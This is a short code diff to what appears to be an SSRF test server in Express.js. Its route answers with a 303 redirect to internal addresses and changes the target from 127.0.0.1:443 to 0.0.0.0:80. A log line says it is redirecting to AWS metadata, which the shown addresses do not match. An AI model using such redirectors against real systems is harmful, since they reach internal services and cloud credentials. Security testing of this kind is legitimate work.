@@ -5,7 +5,7 @@ const PORT = 3000; // Change port if needed
 
 // Route to trigger SSRF via 303 redirect
 app.get("/", (req, res) => {
-  res.status(303).set("Location", "http://127.0.0.1:443/").send();
+  res.status(303).set("Location", "http://0.0.0.0:80/").send();
   console.log("Redirecting to AWS Metadata...");
 });
 
